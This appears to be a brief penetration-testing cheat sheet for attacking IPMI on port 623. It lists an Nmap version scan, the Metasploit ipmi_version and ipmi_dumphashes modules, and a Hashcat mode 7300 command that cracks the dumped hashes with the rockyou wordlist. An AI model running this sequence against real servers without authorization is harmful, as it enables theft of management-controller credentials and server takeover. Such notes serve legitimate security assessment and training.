# Nmap

```bash
sudo nmap -sU --script ipmi-version -p 623 $IP
```

# Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

# Hashcat

```bash
hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt
```
